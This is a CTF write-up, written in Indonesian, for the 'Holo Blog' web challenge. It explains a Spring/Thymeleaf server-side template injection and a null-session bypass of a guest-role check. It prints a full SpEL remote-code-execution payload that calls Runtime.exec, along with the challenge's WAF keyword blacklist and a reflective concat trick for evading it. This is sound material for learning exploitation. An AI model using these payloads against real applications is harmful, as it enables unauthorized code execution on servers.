# Holo Blog

|Category|Solves|
|--------|------|
|Web|0/12|

## Challenge Difficulty Overview
### Challenge Difficulty
| Points | Difficulty | Stars |
|--------|------------|-------|
| 3.90/5.00 | hard | ★★★★ |

### Points Breakdown
| Name | Value |
|------|-------|
| Multifaceted Skills Needed | 4 |
| Complex Code/Payload/Bypass | 5 |
| Multiple Steps of Complexity | 2 |
| Dynamic Elements and Updates | 2 |
| Hidden Attack Vectors or Non-Traditional Attack Vectors | 4 |

> Note: Based on [ctf-difficulty-calculator](https://github.com/dimasma0305/ctf-challenge-difficulty-calculator)


# Description
Just finished Hololep blog yesterday, can you check it for me?

# Overview

Pada challenge ini terdapat 2 vulnerability. Yang pertama adalah SSTI yang dapat kita lihat pada source code berikut

```java
public class Public {
    @GetMapping("/")
    String index(HttpSession session) throws Exception {
        String lang = (String) session.getAttribute("lang");
        return String.format("lang/%s/index", lang); // vulnerable to SSTI
    }
}
```
> [source code](https://github.com/dimasma0305/My-CTF-Challenges/blob/cffb36330020de892d3073a42d71bc6e50a8d23b/Hology-final-2023/Holo-Blog/src/src/main/java/com/blog/blog/controler/Public.java#L13)

Dan yang kedua adalah null session trick untuk membypass `"guest".equals(role)`. Kita dapat merubah atribute "lang" dengan melakukan bypass "guest" pada kode berikut:

```java
    @PatchMapping("/lang")
    DefaultResponseFormat patchLang(@Valid @RequestBody(required = true) Lang data, HttpSession session)
            throws Exception {
        val defaultResponseFormat = new DefaultResponseFormat();
        val sessionId = session.getId();
        val user = new User();
        val role = user.getRole(sessionId);
        if ("guest".equals(role)) {
            throw new HttpClientErrorException(HttpStatus.UNAUTHORIZED, "Unauthorized");
        } else {
            session.setAttribute("lang", data.getLang());
            defaultResponseFormat.setMessage("ok");
        }
        return defaultResponseFormat;
    }
```
> [source code](https://github.com/dimasma0305/My-CTF-Challenges/blob/88ed381fead0fea20a2d0f5b45b657f88148b9c2/Hology-final-2023/Holo-Blog/src/src/main/java/com/blog/blog/controler/RestPublic.java#L34)

Kalian dapat melakukan bypass dengan cara membuat "role" menjadi null, ini bisa dilakukan dengan mengakses endpoint refresh:

```java
    @GetMapping("/refresh")
    RedirectView refresh(HttpSession session, HttpServletResponse response) throws SQLException {
        val redirectView = new RedirectView("/");
        val sessionId = session.getId();
        val user = new User();
        user.deleteUserByUserId(sessionId);
        response.setHeader("Set-Cookie", "JSESSIONID=null; Path=/; HttpOnly");
        return redirectView;
    }
```
> [source code](https://github.com/dimasma0305/My-CTF-Challenges/blob/88ed381fead0fea20a2d0f5b45b657f88148b9c2/Hology-final-2023/Holo-Blog/src/src/main/java/com/blog/blog/controler/RestPublic.java#L43)

Karna pada endpoint refresh melakukan delete pada user, maka program melakukan request ke database, maka username kita akan null.

## SSTI

Kita sudah dapat menkontrol atribute "lang", sekarang kita bisa melakukan SSTI spring view manipulation yang bisa kalian lihat penjelasannya pada artikel berikut: [link](https://github.com/veracode-research/spring-view-manipulation)

Tapi karna terdapat restriksi dari thymeleaf, kita harus membypass restriksi itu menggunakan [CVE-2023-38286](https://nvd.nist.gov/vuln/detail/CVE-2023-38286) yang POC-nya dapat kita lihat pada github repo berikut https://github.com/p1n93r/SpringBootAdmin-thymeleaf-SSTI .

Base Payload untuk melakukan exploit SSTI pada challenge ini dengan menggunakanas bypass tersebut kurang lebih seperti ini:

```java
getRuntimeMethod=''.getClass().forName('org.springframework.util.ReflectionUtils').findMethod(''.getClass().forName('org.springframework.util.ClassUtils').forName('java.lang.Runtime',''.getClass().forName('org.springframework.util.ClassUtils').getDefaultClassLoader()), 'getRuntime' )

runtimeObj=''.getClass().forName('org.springframework.util.ReflectionUtils').invokeMethod(getRuntimeMethod, null)

exeMethod=''.getClass().forName('org.springframework.util.ReflectionUtils').findMethod(''.getClass().forName('org.springframework.util.ClassUtils').forName('java.lang.Runtime',''.getClass().forName('org.springframework.util.ClassUtils').getDefaultClassLoader()), 'exec', ''.getClass())

finals=''.getClass().forName('org.springframework.util.ReflectionUtils').invokeMethod(exeMethod, runtimeObj, 'calc' )
```

Dikarenakan kita tidak bisa menggunakan `T()` seperti pada POC, kita menggantinya menggunakan `''.getClass().forName()`.

Jika digabungkan semua payload tersebut, maka final payload akan terlihat seperti berikut:

```java
__${''.getClass().forName('org.springframework.util.ReflectionUtils').invokeMethod(''.getClass().forName('org.springframework.util.ReflectionUtils').findMethod(''.getClass().forName('org.springframework.util.ClassUtils').forName('java.lang.Runtime',''.getClass().forName('org.springframework.util.ClassUtils').getDefaultClassLoader()), 'exec', ''.getClass()), ''.getClass().forName('org.springframework.util.ReflectionUtils').invokeMethod(''.getClass().forName('org.springframework.util.ReflectionUtils').findMethod(''.getClass().forName('org.springframework.util.ClassUtils').forName('java.lang.Runtime',''.getClass().forName('org.springframework.util.ClassUtils').getDefaultClassLoader()), 'getRuntime' ), null), 'calc' )}__
```

Sekarang kita perlu membypass WAF berikut ini:

```java
public class WAF {
    private static enum WafList {
        SSTI("\"", "+", "Runtime", "concat", "replace", "join", "format", "substring", "class", "java", "exec", "char",
                "Process", "cmd", "eval", "Char", "true", "false");

        @Getter
        private final String[] blacklist;

        WafList(String... blacklist) {
            this.blacklist = blacklist;
        }
    }
```

> [source code](https://github.com/dimasma0305/My-CTF-Challenges/blob/88ed381fead0fea20a2d0f5b45b657f88148b9c2/Hology-final-2023/Holo-Blog/src/src/main/java/com/blog/blog/waf/WAF.java#L6C1-L17C6)

Disini untuk melakukan bypass kita menggunakan concat untu mekonstruksi string yang bisa kita panggil seperti berikut:

```java
''.getClass().getMethods()[47].invoke(str1,str2)
```
> Note: concat tidak selalu berada di index ke 47, ini tergantung kode java dan juga versi java yang kita gunakan.

Untuk final payload bisa di lihat pada folder [./writeup](./writeup/)


# Reference
- https://github.com/p1n93r/SpringBootAdmin-thymeleaf-SSTI
- https://github.com/veracode-research/spring-view-manipulation
